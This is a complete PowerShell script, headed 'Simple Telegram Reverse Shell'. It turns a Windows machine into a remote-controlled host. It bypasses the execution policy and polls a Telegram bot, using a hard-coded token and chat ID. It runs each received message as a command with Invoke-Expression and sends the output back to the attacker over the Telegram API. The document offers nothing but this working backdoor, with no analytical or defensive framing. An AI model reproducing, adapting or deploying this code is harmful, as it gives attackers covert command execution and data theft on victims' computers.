# Simple Telegram Reverse Shell
param(
    [string]$BotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
    [string]$ChatID = "2047893044"
)

Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Send-Telegram {
    param($Message)
    try {
        $url = "https://api.telegram.org/bot$BotToken/sendMessage"
        $body = @{chat_id=$ChatID; text=$Message} | ConvertTo-Json
        Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" | Out-Null
        return $true
    } catch { return $false }
}

function Get-Updates {
    try {
        $url = "https://api.telegram.org/bot$BotToken/getUpdates"
        return Invoke-RestMethod -Uri $url -Method Get
    } catch { return $null }
}

# Test connection first
if (Send-Telegram "ðŸ”„ Testing connection...") {
    Write-Host "Connection test successful!" -ForegroundColor Green
} else {
    Write-Host "Connection test failed. Check bot token and chat ID." -ForegroundColor Red
    exit
}

$lastId = 0
Write-Host "Reverse shell active. Waiting for commands..." -ForegroundColor Green

while ($true) {
    $updates = Get-Updates
    if ($updates -and $updates.ok) {
        foreach ($update in $updates.result) {
            if ($update.update_id -gt $lastId -and $update.message -and $update.message.text) {
                $lastId = $update.update_id
                $cmd = $update.message.text
                
                Write-Host "Executing: $cmd" -ForegroundColor Yellow
                
                if ($cmd -eq "exit") {
                    Send-Telegram "ðŸ”Œ Shell disconnected" | Out-Null
                    exit
                }
                
                try {
                    $result = Invoke-Expression $cmd 2>&1 | Out-String
                    if (!$result) { $result = "Command executed (no output)" }
                } catch {
                    $result = "Error: $($_.Exception.Message)"
                }
                
                # Split long messages
                if ($result.Length -gt 4000) {
                    $chunks = [regex]::Matches($result, ".{1,4000}")
                    foreach ($chunk in $chunks) {
                        Send-Telegram $chunk.Value | Out-Null
                        Start-Sleep -Seconds 1
                    }
                } else {
                    Send-Telegram $result | Out-Null
                }
            }
        }
    }
    Start-Sleep -Seconds 2
}
